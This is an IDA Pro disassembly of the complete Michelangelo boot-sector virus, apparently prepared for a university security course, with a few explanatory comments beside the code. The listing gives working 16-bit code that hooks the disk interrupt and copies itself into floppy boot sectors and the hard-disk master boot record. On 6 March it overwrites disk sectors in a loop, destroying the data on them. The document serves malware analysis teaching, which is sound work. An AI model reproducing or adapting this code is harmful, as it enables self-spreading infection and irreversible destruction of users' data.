seg000:7C00    ;                                                                             | 
seg000:7C00    ; +-------------------------------------------------------------------------+ | 
seg000:7C00    ; | This file has been generated by The Interactive Disassembler (IDA) |      | 
seg000:7C00    ; | Copyright (c) 2014 Hex-Rays, <support@hex-rays.com> |                     | 
seg000:7C00    ; | License info: 48-B071-7234-BB |                                           | 
seg000:7C00    ; | Golden Richard, University of New Orleans |                               | 
seg000:7C00    ; +-------------------------------------------------------------------------+ | 
seg000:7C00    ;                                                                             | 
seg000:7C00    ; Input MD5 : 3FFC402675E30C6E42560EAA0A90A2B7                                | 
seg000:7C00    ; Input CRC32 : 827C7725                                                      | 
seg000:7C00                                                                                  | 
seg000:7C00    ; --------------------------------------------------------------------------- | 
seg000:7C00    ; File Name : /Users/golden/Work/class/4622/examples/MICHELANGELO/m.1         | 
seg000:7C00    ; Format : Binary file                                                        | 
seg000:7C00    ; Base Address: 0000h Range: 0000h - 0200h Loaded length: 0200h               | 
seg000:7C00                                                                                  | 
seg000:7C00    .686p                                                                         | 
seg000:7C00    .mmx                                                                          | 
seg000:7C00    .model flat                                                                   | 
seg000:7C00                                                                                  | 
seg000:7C00    ; =========================================================================== | 
seg000:7C00                                                                                  | 
seg000:7C00    ; Segment type: Regular                                                       | 
seg000:7C00    seg000 segment byte public '' use16                                           | 
seg000:7C00    assume cs:seg000                                                              | 
seg000:7C00    ;org 7C00h                                                                    | 
seg000:7C00    assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing             | 
seg000:7C00    jmp loc_7CAF                                                                  | jump to start of program
seg000:7C00    ; --------------------------------------------------------------------------- | 
seg000:7C03    unk_7C03 db 0F5h ; Ãµ ; DATA XREF: seg000:7CF0r                               | 
seg000:7C04    db 0                                                                          | 
seg000:7C05    word_7C05 dw 0 ; DATA XREF: seg000:7CD8w                                      | 
seg000:7C07    db 2                                                                          | 
seg000:7C08    db 0Eh                                                                        | 
seg000:7C09    db 0                                                                          | 
seg000:7C0A    word_7C0A dw 9739h ; DATA XREF: seg000:7CC1w                                  | 
seg000:7C0C    word_7C0C dw 0F000h ; DATA XREF: seg000:7CC7w                                 | 
seg000:7C0E    ; --------------------------------------------------------------------------- | 
seg000:7C0E    push ds                                                                       | 
seg000:7C0F    push ax                                                                       | 
seg000:7C10    or dl, dl                                                                     | 
seg000:7C12    jnz short loc_7C2F                                                            | 
seg000:7C14    xor ax, ax                                                                    | 
seg000:7C16    mov ds, ax                                                                    | 
seg000:7C18    test byte ptr ds:43Fh, 1                                                      | 
seg000:7C1D    jnz short loc_7C2F                                                            | 
seg000:7C1F    pop ax                                                                        | 
seg000:7C20    pop ds                                                                        | 
seg000:7C21    pushf                                                                         | 
seg000:7C22    call dword ptr cs:0Ah                                                         | 
seg000:7C27    pushf                                                                         | 
seg000:7C28    call sub_7C36                                                                 | 
seg000:7C2B    popf                                                                          | 
seg000:7C2C    retf 2                                                                        | 
seg000:7C2F    ; --------------------------------------------------------------------------- | 
seg000:7C2F                                                                                  | 
seg000:7C2F    loc_7C2F: ; CODE XREF: seg000:7C12j                                           | 
seg000:7C2F    ; seg000:7C1Dj                                                                | 
seg000:7C2F    pop ax                                                                        | 
seg000:7C30    pop ds                                                                        | 
seg000:7C31    jmp dword ptr cs:0Ah                                                          | 
seg000:7C36                                                                                  | 
seg000:7C36    ; =============== S U B R O U T I N E ======================================= | 
seg000:7C36                                                                                  | 
seg000:7C36                                                                                  | 
seg000:7C36    sub_7C36 proc near ; CODE XREF: seg000:7C28p                                  | 
seg000:7C36    push ax                                                                       | 
seg000:7C37    push bx                                                                       | 
seg000:7C38    push cx                                                                       | 
seg000:7C39    push dx                                                                       | 
seg000:7C3A    push ds                                                                       | 
seg000:7C3B    push es                                                                       | 
seg000:7C3C    push si                                                                       | 
seg000:7C3D    push di                                                                       | 
seg000:7C3E    push cs                                                                       | 
seg000:7C3F    pop ds                                                                        | 
seg000:7C40    push cs                                                                       | 
seg000:7C41    pop es                                                                        | 
seg000:7C42    mov si, 4                                                                     | 
seg000:7C45                                                                                  | 
seg000:7C45    loc_7C45: ; CODE XREF: sub_7C36+29j                                           | 
seg000:7C45    mov ax, 201h                                                                  | 
seg000:7C48    mov bx, 200h                                                                  | 
seg000:7C4B    mov cx, 1                                                                     | 
seg000:7C4E    xor dx, dx                                                                    | 
seg000:7C50    pushf                                                                         | 
seg000:7C51    call dword ptr ds:0Ah                                                         | 
seg000:7C55    jnb short loc_7C63                                                            | 
seg000:7C57    xor ax, ax                                                                    | 
seg000:7C59    pushf                                                                         | 
seg000:7C5A    call dword ptr ds:0Ah                                                         | 
seg000:7C5E    dec si                                                                        | 
seg000:7C5F    jnz short loc_7C45                                                            | 
seg000:7C61    jmp short loc_7CA6                                                            | 
seg000:7C63    ; --------------------------------------------------------------------------- | 
seg000:7C63                                                                                  | 
seg000:7C63    loc_7C63: ; CODE XREF: sub_7C36+1Fj                                           | 
seg000:7C63    xor si, si                                                                    | 
seg000:7C65    cld                                                                           | 
seg000:7C66    lodsw                                                                         | 
seg000:7C67    cmp ax, [bx]                                                                  | 
seg000:7C69    jnz short loc_7C71                                                            | 
seg000:7C6B    lodsw                                                                         | 
seg000:7C6C    cmp ax, [bx+2]                                                                | 
seg000:7C6F    jz short loc_7CA6                                                             | 
seg000:7C71                                                                                  | 
seg000:7C71    loc_7C71: ; CODE XREF: sub_7C36+33j                                           | 
seg000:7C71    mov ax, 301h                                                                  | 
seg000:7C74    mov dh, 1                                                                     | 
seg000:7C76    mov cl, 3                                                                     | 
seg000:7C78    cmp byte ptr [bx+15h], 0FDh ; 'Ã½'                                            | 
seg000:7C7C    jz short loc_7C80                                                             | 
seg000:7C7E    mov cl, 0Eh                                                                   | 
seg000:7C80                                                                                  | 
seg000:7C80    loc_7C80: ; CODE XREF: sub_7C36+46j                                           | 
seg000:7C80    mov ds:8, cx                                                                  | 
seg000:7C84    pushf                                                                         | 
seg000:7C85    call dword ptr ds:0Ah                                                         | 
seg000:7C89    jb short loc_7CA6                                                             | 
seg000:7C8B    mov si, 3BEh                                                                  | 
seg000:7C8E    mov di, 1BEh                                                                  | 
seg000:7C91    mov cx, 21h ; '!'                                                             | 
seg000:7C94    cld                                                                           | 
seg000:7C95    rep movsw                                                                     | 
seg000:7C97    mov ax, 301h                                                                  | 
seg000:7C9A    xor bx, bx                                                                    | 
seg000:7C9C    mov cx, 1                                                                     | 
seg000:7C9F    xor dx, dx                                                                    | 
seg000:7CA1    pushf                                                                         | 
seg000:7CA2    call dword ptr ds:0Ah                                                         | 
seg000:7CA6                                                                                  | 
seg000:7CA6    loc_7CA6: ; CODE XREF: sub_7C36+2Bj                                           | 
seg000:7CA6    ; sub_7C36+39j ...                                                            | 
seg000:7CA6    pop di                                                                        | 
seg000:7CA7    pop si                                                                        | 
seg000:7CA8    pop es                                                                        | 
seg000:7CA9    pop ds                                                                        | 
seg000:7CAA    pop dx                                                                        | 
seg000:7CAB    pop cx                                                                        | 
seg000:7CAC    pop bx                                                                        | 
seg000:7CAD    pop ax                                                                        | 
seg000:7CAE    retn                                                                          | 
seg000:7CAE    sub_7C36 endp                                                                 | 
seg000:7CAE                                                                                  | 
seg000:7CAF    ; --------------------------------------------------------------------------- | 
seg000:7CAF                                                                                  | 
seg000:7CAF    loc_7CAF: ; CODE XREF: seg000:7C00j                                           | start of program
seg000:7CAF    xor ax, ax                                                                    | clear ax
seg000:7CB1    mov ds, ax                                                                    | initialize data segment pointer to 0
seg000:7CB3    cli                                                                           | ignore external interrupts
seg000:7CB4    mov ss, ax                                                                    | initialize stack segment pointer to 0
seg000:7CB6    mov ax, 7C00h                                                                 | store program start address in ax
seg000:7CB9    mov sp, ax                                                                    | start stack at 7C00h
seg000:7CBB    sti                                                                           | enable external interrupts
seg000:7CBC    push ds                                                                       | push 0 onto stack
seg000:7CBD    push ax                                                                       | push 7C00h onto stack
seg000:7CBE    mov ax, ds:4Ch                                                                | store 4Ch into ax
seg000:7CC1    mov ds:word_7C0A, ax                                                          | 
seg000:7CC4    mov ax, ds:4Eh                                                                | 
seg000:7CC7    mov ds:word_7C0C, ax                                                          | 
seg000:7CCA    mov ax, ds:413h                                                               | 
seg000:7CCD    dec ax                                                                        | 
seg000:7CCE    dec ax                                                                        | 
seg000:7CCF    mov ds:413h, ax                                                               | 
seg000:7CD2    mov cl, 6                                                                     | 
seg000:7CD4    shl ax, cl                                                                    | 
seg000:7CD6    mov es, ax                                                                    | 
seg000:7CD8    mov ds:word_7C05, ax                                                          | 
seg000:7CDB    mov ax, 0Eh                                                                   | 
seg000:7CDE    mov ds:4Ch, ax                                                                | 
seg000:7CE1    mov word ptr ds:4Eh, es                                                       | 
seg000:7CE5    mov cx, 1BEh                                                                  | 
seg000:7CE8    mov si, 7C00h                                                                 | 
seg000:7CEB    xor di, di                                                                    | 
seg000:7CED    cld                                                                           | 
seg000:7CEE    rep movsb                                                                     | 
seg000:7CF0    jmp dword ptr cs:unk_7C03                                                     | 
seg000:7CF5    ; --------------------------------------------------------------------------- | 
seg000:7CF5    xor ax, ax                                                                    | 
seg000:7CF7    mov es, ax                                                                    | 
seg000:7CF9    int 13h ; DISK - RESET DISK SYSTEM                                            | 
seg000:7CF9    ; DL = drive (if bit 7 is set both hard disks and floppy disks reset)         | 
seg000:7CFB    push cs                                                                       | 
seg000:7CFC    pop ds                                                                        | 
seg000:7CFD    mov ax, 201h                                                                  | 
seg000:7D00    mov bx, 7C00h                                                                 | 
seg000:7D03    mov cx, ds:8                                                                  | 
seg000:7D07    cmp cx, 7                                                                     | 
seg000:7D0A    jnz short loc_7D13                                                            | 
seg000:7D0C    mov dx, 80h ; 'â‚¬'                                                           | 
seg000:7D0F    int 13h ; DISK - READ SECTORS INTO MEMORY                                     | 
seg000:7D0F    ; AL = number of sectors to read, CH = track, CL = sector                     | 
seg000:7D0F    ; DH = head, DL = drive, ES:BX -> buffer to fill                              | 
seg000:7D0F    ; Return: CF set on error, AH = status, AL = number of sectors read           | 
seg000:7D11    jmp short loc_7D3E                                                            | 
seg000:7D13    ; --------------------------------------------------------------------------- | 
seg000:7D13                                                                                  | 
seg000:7D13    loc_7D13: ; CODE XREF: seg000:7D0Aj                                           | 
seg000:7D13    mov cx, ds:8                                                                  | 
seg000:7D17    mov dx, 100h                                                                  | 
seg000:7D1A    int 13h ; DISK -                                                              | 
seg000:7D1C    jb short loc_7D3E                                                             | 
seg000:7D1E    push cs                                                                       | 
seg000:7D1F    pop es                                                                        | 
seg000:7D20    mov ax, 201h                                                                  | 
seg000:7D23    mov bx, 200h                                                                  | 
seg000:7D26    mov cx, 1                                                                     | 
seg000:7D29    mov dx, 80h ; 'â‚¬'                                                           | 
seg000:7D2C    int 13h ; DISK - READ SECTORS INTO MEMORY                                     | 
seg000:7D2C    ; AL = number of sectors to read, CH = track, CL = sector                     | 
seg000:7D2C    ; DH = head, DL = drive, ES:BX -> buffer to fill                              | 
seg000:7D2C    ; Return: CF set on error, AH = status, AL = number of sectors read           | 
seg000:7D2E    jb short loc_7D3E                                                             | 
seg000:7D30    xor si, si                                                                    | 
seg000:7D32    cld                                                                           | 
seg000:7D33    lodsw                                                                         | 
seg000:7D34    cmp ax, [bx]                                                                  | 
seg000:7D36    jnz short loc_7D87                                                            | 
seg000:7D38    lodsw                                                                         | 
seg000:7D39    cmp ax, [bx+2]                                                                | 
seg000:7D3C    jnz short loc_7D87                                                            | 
seg000:7D3E                                                                                  | 
seg000:7D3E    loc_7D3E: ; CODE XREF: seg000:7D11j                                           | 
seg000:7D3E    ; seg000:7D1Cj ...                                                            | 
seg000:7D3E    xor cx, cx                                                                    | 
seg000:7D40    mov ah, 4                                                                     | 
seg000:7D42    int 1Ah ; CLOCK - READ DATE FROM REAL TIME CLOCK (AT,XT286,CONV,PS)           | 
seg000:7D42    ; Return: DL = day in BCD                                                     | 
seg000:7D42    ; DH = month in BCD                                                           | 
seg000:7D42    ; CL = year in BCD                                                            | 
seg000:7D42    ; CH = century (19h or 20h)                                                   | 
seg000:7D44    cmp dx, 306h                                                                  | 
seg000:7D48    jz short loc_7D4B                                                             | 
seg000:7D4A    retf                                                                          | 
seg000:7D4B    ; --------------------------------------------------------------------------- | 
seg000:7D4B                                                                                  | 
seg000:7D4B    loc_7D4B: ; CODE XREF: seg000:7D48j                                           | 
seg000:7D4B    xor dx, dx                                                                    | 
seg000:7D4D    mov cx, 1                                                                     | 
seg000:7D50                                                                                  | 
seg000:7D50    loc_7D50: ; CODE XREF: seg000:7D7Fj                                           | 
seg000:7D50    ; seg000:7D85j                                                                | 
seg000:7D50    mov ax, 309h                                                                  | 
seg000:7D53    mov si, ds:8                                                                  | 
seg000:7D57    cmp si, 3                                                                     | 
seg000:7D5A    jz short loc_7D6C                                                             | 
seg000:7D5C    mov al, 0Eh                                                                   | 
seg000:7D5E    cmp si, 0Eh                                                                   | 
seg000:7D61    jz short loc_7D6C                                                             | 
seg000:7D63    mov dl, 80h ; 'â‚¬'                                                           | 
seg000:7D65    mov byte ptr ds:7, 4                                                          | 
seg000:7D6A    mov al, 11h                                                                   | 
seg000:7D6C                                                                                  | 
seg000:7D6C    loc_7D6C: ; CODE XREF: seg000:7D5Aj                                           | 
seg000:7D6C    ; seg000:7D61j                                                                | 
seg000:7D6C    mov bx, 5000h                                                                 | 
seg000:7D6F    mov es, bx                                                                    | 
seg000:7D71    assume es:nothing                                                             | 
seg000:7D71    int 13h ; DISK - WRITE SECTORS FROM MEMORY                                    | 
seg000:7D71    ; AL = number of sectors to write, CH = track, CL = sector                    | 
seg000:7D71    ; DH = head, DL = drive, ES:BX -> buffer                                      | 
seg000:7D71    ; Return: CF set on error, AH = status, AL = number of sectors written        | 
seg000:7D73    jnb short loc_7D79                                                            | 
seg000:7D75    xor ah, ah                                                                    | 
seg000:7D77    int 13h ; DISK - RESET DISK SYSTEM                                            | 
seg000:7D77    ; DL = drive (if bit 7 is set both hard disks and floppy disks reset)         | 
seg000:7D79                                                                                  | 
seg000:7D79    loc_7D79: ; CODE XREF: seg000:7D73j                                           | 
seg000:7D79    inc dh                                                                        | 
seg000:7D7B    cmp dh, ds:7                                                                  | 
seg000:7D7F    jb short loc_7D50                                                             | 
seg000:7D81    xor dh, dh                                                                    | 
seg000:7D83    inc ch                                                                        | 
seg000:7D85    jmp short loc_7D50                                                            | 
seg000:7D87    ; --------------------------------------------------------------------------- | 
seg000:7D87                                                                                  | 
seg000:7D87    loc_7D87: ; CODE XREF: seg000:7D36j                                           | 
seg000:7D87    ; seg000:7D3Cj                                                                | 
seg000:7D87    mov cx, 7                                                                     | 
seg000:7D8A    mov ds:8, cx                                                                  | 
seg000:7D8E    mov ax, 301h                                                                  | 
seg000:7D91    mov dx, 80h ; 'â‚¬'                                                           | 
seg000:7D94    int 13h ; DISK - WRITE SECTORS FROM MEMORY                                    | 
seg000:7D94    ; AL = number of sectors to write, CH = track, CL = sector                    | 
seg000:7D94    ; DH = head, DL = drive, ES:BX -> buffer                                      | 
seg000:7D94    ; Return: CF set on error, AH = status, AL = number of sectors written        | 
seg000:7D96    jb short loc_7D3E                                                             | 
seg000:7D98    mov si, 3BEh                                                                  | 
seg000:7D9B    mov di, 1BEh                                                                  | 
seg000:7D9E    mov cx, 21h ; '!'                                                             | 
seg000:7DA1    rep movsw                                                                     | 
seg000:7DA3    mov ax, 301h                                                                  | 
seg000:7DA6    xor bx, bx                                                                    | 
seg000:7DA8    inc cl                                                                        | 
seg000:7DAA    int 13h ; DISK - WRITE SECTORS FROM MEMORY                                    | 
seg000:7DAA    ; AL = number of sectors to write, CH = track, CL = sector                    | 
seg000:7DAA    ; DH = head, DL = drive, ES:BX -> buffer                                      | 
seg000:7DAA    ; Return: CF set on error, AH = status, AL = number of sectors written        | 
seg000:7DAC    jmp short loc_7D3E                                                            | 
seg000:7DAC    ; --------------------------------------------------------------------------- | 
seg000:7DAE    db 0                                                                          | 
seg000:7DAF    db 0                                                                          | 
seg000:7DB0    db 0                                                                          | 
seg000:7DB1    db 0                                                                          | 
seg000:7DB2    db 0                                                                          | 
seg000:7DB3    db 0                                                                          | 
seg000:7DB4    db 0                                                                          | 
seg000:7DB5    db 0                                                                          | 
seg000:7DB6    db 0                                                                          | 
seg000:7DB7    db 0                                                                          | 
seg000:7DB8    db 0                                                                          | 
seg000:7DB9    db 0                                                                          | 
seg000:7DBA    db 0                                                                          | 
seg000:7DBB    db 0                                                                          | 
seg000:7DBC    db 0                                                                          | 
seg000:7DBD    db 0                                                                          | 
seg000:7DBE    db 0                                                                          | 
seg000:7DBF    db 0                                                                          | 
seg000:7DC0    db 0                                                                          | 
seg000:7DC1    db 0                                                                          | 
seg000:7DC2    db 0                                                                          | 
seg000:7DC3    db 0                                                                          | 
seg000:7DC4    db 0                                                                          | 
seg000:7DC5    db 0                                                                          | 
seg000:7DC6    db 0                                                                          | 
seg000:7DC7    db 0                                                                          | 
seg000:7DC8    db 0                                                                          | 
seg000:7DC9    db 0                                                                          | 
seg000:7DCA    db 0                                                                          | 
seg000:7DCB    db 0                                                                          | 
seg000:7DCC    db 0                                                                          | 
seg000:7DCD    db 0                                                                          | 
seg000:7DCE    db 0                                                                          | 
seg000:7DCF    db 0                                                                          | 
seg000:7DD0    db 0                                                                          | 
seg000:7DD1    db 0                                                                          | 
seg000:7DD2    db 0                                                                          | 
seg000:7DD3    db 0                                                                          | 
seg000:7DD4    db 0                                                                          | 
seg000:7DD5    db 0                                                                          | 
seg000:7DD6    db 0                                                                          | 
seg000:7DD7    db 0                                                                          | 
seg000:7DD8    db 0                                                                          | 
seg000:7DD9    db 0                                                                          | 
seg000:7DDA    db 0                                                                          | 
seg000:7DDB    db 0                                                                          | 
seg000:7DDC    db 0                                                                          | 
seg000:7DDD    db 0                                                                          | 
seg000:7DDE    db 0                                                                          | 
seg000:7DDF    db 0                                                                          | 
seg000:7DE0    db 0                                                                          | 
seg000:7DE1    db 0                                                                          | 
seg000:7DE2    db 0                                                                          | 
seg000:7DE3    db 0                                                                          | 
seg000:7DE4    db 0                                                                          | 
seg000:7DE5    db 0                                                                          | 
seg000:7DE6    db 0                                                                          | 
seg000:7DE7    db 0                                                                          | 
seg000:7DE8    db 0                                                                          | 
seg000:7DE9    db 0                                                                          | 
seg000:7DEA    db 0                                                                          | 
seg000:7DEB    db 0                                                                          | 
seg000:7DEC    db 0                                                                          | 
seg000:7DED    db 0                                                                          | 
seg000:7DEE    db 0                                                                          | 
seg000:7DEF    db 0                                                                          | 
seg000:7DF0    db 0                                                                          | 
seg000:7DF1    db 0                                                                          | 
seg000:7DF2    db 0                                                                          | 
seg000:7DF3    db 0                                                                          | 
seg000:7DF4    db 0                                                                          | 
seg000:7DF5    db 0                                                                          | 
seg000:7DF6    db 0                                                                          | 
seg000:7DF7    db 0                                                                          | 
seg000:7DF8    db 0                                                                          | 
seg000:7DF9    db 0                                                                          | 
seg000:7DFA    db 0                                                                          | 
seg000:7DFB    db 0                                                                          | 
seg000:7DFC    db 0                                                                          | 
seg000:7DFD    db 0                                                                          | 
seg000:7DFE    db 55h ; U                                                                    | 
seg000:7DFF    db 0AAh ; Âª                                                                  | 
seg000:7DFF    seg000 ends                                                                   | 
seg000:7DFF                                                                                  | 
seg000:7DFF                                                                                  | 
seg000:7DFF    end                                                                           | 
